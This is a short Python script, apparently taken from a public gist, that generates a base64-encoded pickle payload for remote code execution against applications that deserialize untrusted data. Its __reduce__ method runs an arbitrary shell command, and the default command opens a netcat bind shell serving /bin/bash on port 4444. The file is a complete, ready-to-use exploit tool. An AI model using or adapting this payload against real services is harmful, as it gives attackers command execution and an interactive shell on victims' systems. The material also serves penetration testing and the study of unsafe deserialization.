#!/usr/bin/python
#
# Pickle deserialization RCE payload.
# To be invoked with command to execute at it's first parameter.
# Otherwise, the default one will be used.
#
#Usage example:
#C:\Users\pickle> python python_pickle_payload.py "uname -a"
#Y250CnN5c3RlbQpwMQooUyd1bmFtZSAtYScKcDIKdFJwMwou

#copied from - https://gist.github.com/mgeeky/cbc7017986b2ec3e247aab0b01a9edcd
#Thanks to https://gist.github.com/mgeeky

import cPickle
import sys
import base64

DEFAULT_COMMAND = "netcat -c '/bin/bash -i' -l -p 4444"
COMMAND = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_COMMAND

class PickleRce(object):
    def __reduce__(self):
        import os
        return (os.system,(COMMAND,))

print base64.b64encode(cPickle.dumps(PickleRce()))
